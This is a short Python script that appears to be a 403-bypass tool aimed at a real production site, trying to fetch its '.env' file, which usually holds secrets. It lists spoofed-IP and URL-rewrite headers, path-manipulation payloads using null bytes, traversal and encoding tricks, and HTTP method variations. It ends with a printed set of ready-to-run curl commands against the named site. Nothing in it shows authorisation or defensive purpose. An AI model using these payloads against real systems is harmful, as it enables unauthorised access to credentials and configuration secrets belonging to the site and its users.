import subprocess
import sys

target = "https://www.netflix.com/.env"

# 403 Bypass techniques
bypass_headers = [
    # IP Spoofing headers
    '-H "X-Originating-IP: 127.0.0.1"',
    '-H "X-Forwarded-For: 127.0.0.1"',
    '-H "X-Forwarded: 127.0.0.1"',
    '-H "Forwarded-For: 127.0.0.1"',
    '-H "X-Remote-IP: 127.0.0.1"',
    '-H "X-Remote-Addr: 127.0.0.1"',
    '-H "X-ProxyUser-Ip: 127.0.0.1"',
    '-H "X-Original-URL: /.env"',
    '-H "X-Rewrite-URL: /.env"',
    '-H "X-Custom-IP-Authorization: 127.0.0.1"',
    '-H "X-Host: localhost"',
    '-H "X-Forwarded-Host: localhost"',
    '-H "X-Client-IP: 127.0.0.1"',
    '-H "X-Real-IP: 127.0.0.1"',
    '-H "True-Client-IP: 127.0.0.1"',
    '-H "Cluster-Client-IP: 127.0.0.1"',
    '-H "CF-Connecting-IP: 127.0.0.1"',

    # Referer bypass
    '-H "Referer: https://www.netflix.com/"',
    '-H "Referer: https://admin.netflix.com/"',
]

# Path manipulation techniques
path_bypasses = [
    "/.env",
    "/;/.env",
    "/.env/.",
    "/.env//",
    "/.env/",
    "/.//.env",
    "/.%00.env",
    "/.env%00",
    "/.env%20",
    "/.env%09",
    "/.env?",
    "/.env??",
    "/.env???",
    "/.env#",
    "/.env/*",
    "/.ENV",
    "/.Env",
    "/..;/.env",
    "/%2e/env",
    "/%2e%2e/.env",
    "/.%2e/.env",
    "/../.env",
    "/..%00/.env",
    "/..%0d/.env",
    "/..%5c.env",
    "/..%ff/.env",
    "/..%c0%af.env",
]

# HTTP Method bypass
methods = ["GET", "POST", "HEAD", "OPTIONS", "PUT", "PATCH", "DELETE", "TRACE", "CONNECT"]

base_url = "https://www.netflix.com"

print("=" * 60)
print("403 BYPASS TESTING")
print("=" * 60)

print("\n[1] Testing Header Bypasses...")
for header in bypass_headers[:5]:  # Test first 5
    cmd = f'curl -s -o /dev/null -w "%{{http_code}}" {header} "{target}"'
    print(f"Testing: {header[:50]}...")

print("\n[2] Testing Path Bypasses...")
for path in path_bypasses[:10]:  # Test first 10
    url = base_url + path
    print(f"Testing: {path}")

print("\n[3] Testing HTTP Methods...")
for method in methods:
    print(f"Testing: {method}")

print("\n" + "=" * 60)
print("MANUAL TESTING COMMANDS")
print("=" * 60)

print("""
# Header Bypass Examples:
curl -s -I -H "X-Forwarded-For: 127.0.0.1" "https://www.netflix.com/.env"
curl -s -I -H "X-Original-URL: /.env" "https://www.netflix.com/"
curl -s -I -H "X-Rewrite-URL: /.env" "https://www.netflix.com/"

# Path Bypass Examples:
curl -s -I "https://www.netflix.com/.env/"
curl -s -I "https://www.netflix.com/.env%00"
curl -s -I "https://www.netflix.com/..;/.env"
curl -s -I "https://www.netflix.com/%2e%2e/.env"

# Method Bypass:
curl -s -I -X POST "https://www.netflix.com/.env"
curl -s -I -X OPTIONS "https://www.netflix.com/.env"

# Case Sensitivity:
curl -s -I "https://www.netflix.com/.ENV"
curl -s -I "https://www.netflix.com/.Env"

# URL Encoding:
curl -s -I "https://www.netflix.com/%2e%65%6e%76"
""")
